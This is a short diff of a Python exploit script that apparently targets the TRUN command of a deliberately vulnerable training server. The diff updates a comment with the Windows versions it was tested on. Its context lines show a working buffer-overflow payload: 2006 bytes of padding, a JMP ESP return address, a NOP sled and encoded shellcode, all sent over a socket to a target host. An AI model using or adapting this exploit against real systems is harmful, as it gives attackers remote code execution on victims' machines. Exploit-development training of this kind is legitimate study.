@@ -1,6 +1,6 @@
 #!/usr/bin/python
 # coding: utf8
-# TRUN direct EIP overwrite
+# TRUN direct EIP overwrite. Tested on Vista Enterprise SP2 32-bit and Windows 7 SP1 32-bit.
 
 import socket
 import time
@@ -37,6 +37,7 @@ shell = ("\xda\xd9\xd9\x74\x24\xf4\xba\x8d\x9a\x95\xd7\x5f\x33\xc9"
 #62501205 JMP ESP
 
 buffer = "TRUN " + "A" * 2006 + "." + "\x05\x12\x50\x62" + "\x90" * 30 + shell + "\x43" * 2359
+
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect((IP, PORT))
 time.sleep(2)
